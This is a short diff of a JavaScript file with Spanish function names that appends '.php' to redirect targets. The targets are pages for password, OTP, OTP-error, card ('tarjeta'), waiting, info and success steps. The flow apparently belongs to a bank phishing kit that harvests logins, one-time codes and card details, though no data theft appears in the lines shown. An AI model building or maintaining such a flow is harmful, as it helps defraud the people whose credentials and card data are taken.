@@ -31,7 +31,7 @@ function detectar_dispositivo(){
 
 
 function vista_password(){
-    window.location.href = "../a/PASS";
+    window.location.href = "../a/PASS.php";
 }
 
 function inicio(u){
@@ -45,27 +45,27 @@ function quitar_cargando(){
 }
 
 function vista_info(){
-    window.location.href = "../a/INFO";
+    window.location.href = "../a/INFO.php";
 }
 
 function vista_espera(o){
-    window.location.href = "../a/WAITING?o=" + o;
+    window.location.href = "../a/WAITING.php?o=" + o;
 }
 
 function vista_otp(){
-    window.location.href = "../a/OTP";
+    window.location.href = "../a/OTP.php";
 }
 
 function vista_errorotp(){
-    window.location.href = "../a/ERROTP";
+    window.location.href = "../a/ERROTP.php";
 }
 
 function vista_tarjeta(){
-    window.location.href = "../a/PRODUCT";
+    window.location.href = "../a/PRODUCT.php";
 }
 
 function vista_final(){
-    window.location.href = "../a/SUCCESS";
+    window.location.href = "../a/SUCCESS.php";
 }
 
 function salir(){
